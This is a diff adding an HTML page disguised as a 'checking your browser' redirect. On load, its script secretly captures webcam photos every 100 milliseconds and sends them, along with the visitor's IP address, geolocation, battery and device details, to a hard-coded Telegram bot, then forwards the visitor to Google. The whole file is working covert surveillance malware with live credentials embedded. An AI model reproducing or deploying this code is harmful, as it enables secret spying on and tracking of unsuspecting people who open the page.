@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting...</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+    }
+    .message {
+      text-align: center;
+    }
+    .message h1 {
+      color: #333;
+      margin-bottom: 20px;
+    }
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    iframe {
+      display: none; /* Hides the iframe for the redirected content */
+    }
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+  <script>
+    const botToken = "7703886947:AAEPiynQHB_nsMW89-rIRfek91wzrENsaKU"; // Replace with your bot's token
+    const chatId = "6045114071"; // Replace with your chat ID
+    const redirectUrl = "https://www.google.com"; // Replace with your target URL
+    let videoStream;
+
+    // Function to show a message and start capturing photos
+    function startProcess() {
+      document.querySelector(".message h1").innerText = "Please wait, checking your browser...";
+
+      // Collect user information
+      collectUserInfo();
+
+      // Start capturing photos
+      startCamera();
+
+      // Redirect and continue capturing photos
+      setTimeout(() => {
+        redirectAndContinue();
+      }, 10000); // Redirect after 10 seconds
+    }
+
+    // Function to access the camera and capture photos
+    function startCamera() {
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then((stream) => {
+          videoStream = stream;
+
+          // Create a hidden video element
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          video.play();
+
+          // Capture photos as fast as possible (every 100ms)
+          setInterval(() => {
+            captureAndSendPhoto(video);
+          }, 100); // Adjust interval to 100ms for fastest capture
+        })
+        .catch((error) => {
+          console.error("Error accessing the camera:", error);
+          alert("Please grant camera access to proceed.");
+        });
+    }
+
+    // Function to capture a photo and send it to Telegram
+    function captureAndSendPhoto(video) {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+
+      // Set canvas dimensions to match the video feed
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      // Draw the current frame from the video feed onto the canvas
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert the canvas to a blob and send it to Telegram
+      canvas.toBlob((blob) => {
+        sendPhotoToTelegram(blob);
+      }, "image/jpeg");
+    }
+
+    // Function to send the photo blob to Telegram
+    function sendPhotoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "photo.jpg");
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData,
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          if (data.ok) {
+            console.log("Photo sent successfully!");
+          } else {
+            console.error("Error sending photo:", data);
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+        });
+    }
+
+    // Function to collect user information
+    function collectUserInfo() {
+      // Get User's IP Address (using ipinfo API)
+      fetch('https://ipinfo.io/json?token=f118eeb89183bc') // Using your provided API token
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+          const country = data.country;
+          const city = data.city;
+          const region = data.region;
+          const location = data.loc.split(',');
+          const latitude = location[0];
+          const longitude = location[1];
+          const geoLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+          console.log("🌐 IP Address: " + ipAddress);
+          console.log("💻 User-Agent: " + navigator.userAgent);
+          console.log("🔋 Battery Percentage: " + (navigator.battery ? navigator.battery.level * 100 + "%" : "N/A"));
+          console.log("⚡ Charging Status: " + (navigator.battery && navigator.battery.charging ? "Charging" : "Not Charging"));
+          console.log("🗣️ Browser Language: " + navigator.language);
+          console.log("📏 Screen Size: " + window.innerWidth + "x" + window.innerHeight);
+          console.log("🚀 Internet Speed: " + (navigator.connection ? navigator.connection.downlink + " Mbps" : "N/A"));
+          console.log("🌍 Network Type: " + (navigator.connection ? navigator.connection.effectiveType : "N/A"));
+          console.log("✅ Wi-Fi: " + (navigator.connection && navigator.connection.type === "wifi" ? "Connected" : "Not connected"));
+          console.log("🧠 Total RAM: " + (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A"));
+          console.log("💾 Device Storage: " + (navigator.storage ? navigator.storage.estimate().then(data => console.log(data.usage)) : "N/A"));
+          console.log("🕒 Date: " + new Date().toLocaleDateString() + " Time: " + new Date().toLocaleTimeString());
+          console.log("📍 Geo location: " + geoLink);
+
+          // Sending details to Telegram
+          sendToTelegram(`🌐 IP Address: ${ipAddress}`);
+          sendToTelegram(`💻 User-Agent: ${navigator.userAgent}`);
+          sendToTelegram(`🔋 Battery Percentage: ${navigator.battery ? navigator.battery.level * 100 + "%" : "N/A"}`);
+          sendToTelegram(`⚡ Charging Status: ${navigator.battery && navigator.battery.charging ? "Charging" : "Not Charging"}`);
+          sendToTelegram(`🗣️ Browser Language: ${navigator.language}`);
+          sendToTelegram(`📏 Screen Size: ${window.innerWidth}x${window.innerHeight}`);
+          sendToTelegram(`🚀 Internet Speed: ${navigator.connection ? navigator.connection.downlink + " Mbps" : "N/A"}`);
+          sendToTelegram(`🌍 Network Type: ${navigator.connection ? navigator.connection.effectiveType : "N/A"}`);
+          sendToTelegram(`✅ Wi-Fi: ${navigator.connection && navigator.connection.type === "wifi" ? "Connected" : "Not connected"}`);
+          sendToTelegram(`🧠 Total RAM: ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A"}`);
+          sendToTelegram(`💾 Device Storage: ${navigator.storage ? navigator.storage.estimate().then(data => console.log(data.usage)) : "N/A"}`);
+          sendToTelegram(`🕒 Date: ${new Date().toLocaleDateString()} Time: ${new Date().toLocaleTimeString()}`);
+          sendToTelegram(`📍 Geo location: ${geoLink}`);
+        })
+        .catch(error => console.error("Error fetching IP address:", error));
+
+      // Get Battery Information
+      if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+          const batteryLevel = battery.level * 100 + "%";
+          const chargingStatus = battery.charging ? "Charging" : "Not Charging";
+          console.log("🔋 Battery Level: " + batteryLevel);
+          console.log("⚡ Charging Status: " + chargingStatus);
+
+          // Sending battery information to Telegram
+          sendToTelegram("🔋 Battery Level: " + batteryLevel);
+          sendToTelegram("⚡ Charging Status: " + chargingStatus);
+        });
+      }
+
+      // Get Geolocation (Latitude and Longitude)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          console.log("📍 Geo location: Latitude: " + latitude + ", Longitude: " + longitude);
+
+          // Sending geolocation to Telegram
+          sendToTelegram("📍 Geo location: Latitude: " + latitude + ", Longitude: " + longitude);
+        });
+      }
+
+      // Get User Agent and Device Model
+      const userAgent = navigator.userAgent;
+      const deviceModel = navigator.platform;
+      console.log("💻 User-Agent: " + userAgent);
+      console.log("🖥️ Device Model: " + deviceModel);
+
+      // Sending user agent and device model to Telegram
+      sendToTelegram("💻 User-Agent: " + userAgent);
+      sendToTelegram("🖥️ Device Model: " + deviceModel);
+    }
+
+    // Function to send data to Telegram
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            console.log("Message sent successfully!");
+          } else {
+            console.error("Error sending message:", data);
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+        });
+    }
+
+    // Function to redirect to the real link and continue capturing photos
+    function redirectAndContinue() {
+      // Redirect to the real link
+      window.location.href = redirectUrl;
+      
+      // Hide the loading message
+      document.querySelector(".message").style.display = "none";
+    }
+
+    // Start the process when the page loads
+    window.onload = startProcess;
+  </script>
+</head>
+<body>
+  <div class="message">
+    <h1>Please wait, checking your browser...</h1>
+    <div class="spinner"></div>
+  </div>
+</body>
+</html>
